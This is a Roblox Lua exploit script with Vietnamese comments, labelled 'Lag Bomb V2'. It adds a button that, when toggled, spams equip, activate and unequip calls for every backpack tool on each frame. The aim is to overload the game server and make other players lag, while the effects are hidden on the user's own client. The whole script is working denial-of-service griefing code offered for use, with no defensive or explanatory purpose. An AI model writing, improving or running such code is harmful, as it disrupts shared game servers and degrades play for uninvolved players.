--[[ 
    LAG BOMB V2 - "SMOOTH FOR ME, LAG FOR THEM"
    - Chỉ gây lag cho Server và người chơi khác.
    - Tự động ẩn vật thể để máy ông không bị tuột FPS.
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Backpack = LocalPlayer:WaitForChild("Backpack")

-- 1. Giao diện (Nút bấm)
local ScreenGui = Instance.new("ScreenGui")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = LocalPlayer.PlayerGui
ToggleButton.Size = UDim2.new(0, 120, 0, 45)
ToggleButton.Position = UDim2.new(0, 20, 0, 100)
ToggleButton.Text = "HỦY DIỆT SERVER"
ToggleButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ToggleButton.TextColor3 = Color3.new(1, 0, 0)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Parent = ScreenGui

local isLagging = false

-- 2. Chế độ "Mượt Máy Mình" (Chặn máy mình xử lý hiệu ứng)
local function MakeSmooth(tool)
    for _, part in pairs(tool:GetDescendants()) do
        if part:IsA("BasePart") then
            -- Làm cho máy mình ko nhìn thấy và ko tính toán va chạm
            part.LocalTransparencyModifier = 1
            part.CanCollide = false
        elseif part:IsA("Sound") or part:IsA("ParticleEmitter") or part:IsA("Fire") then
            -- Tắt âm thanh và hiệu ứng hạt trên máy mình
            part.Enabled = false
        end
    end
end

-- 3. Vòng lặp Spam (Tử huyệt gây lag)
ToggleButton.MouseButton1Click:Connect(function()
    isLagging = not isLagging
    ToggleButton.Text = isLagging and "ĐANG PHÁT LỆNH..." or "HỦY DIỆT SERVER"
    ToggleButton.TextColor3 = isLagging and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
end)

RunService.Heartbeat:Connect(function()
    if isLagging then
        local character = LocalPlayer.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        
        -- Lấy toàn bộ Gear trong túi
        local items = Backpack:GetChildren()
        for i = 1, #items do
            local tool = items[i]
            if tool:IsA("Tool") then
                task.spawn(function()
                    -- Tối ưu máy mình trước khi spam
                    MakeSmooth(tool)
                    
                    -- Ép Server nhận lệnh Equip/Unequip liên tục
                    humanoid:EquipTool(tool)
                    
                    -- Nếu Gear có nút bấm thì kích hoạt luôn để tạo thêm hiệu ứng cho server
                    if tool:FindFirstChild("RemoteClick") or tool:FindFirstChild("Activate") then
                        tool:Activate()
                    end
                    
                    tool.Parent = Backpack
                end)
            end
        end
    end
end)

print("🔥 Lag Bomb V2 Ready! Máy ông sẽ mượt, Server sẽ khóc.")
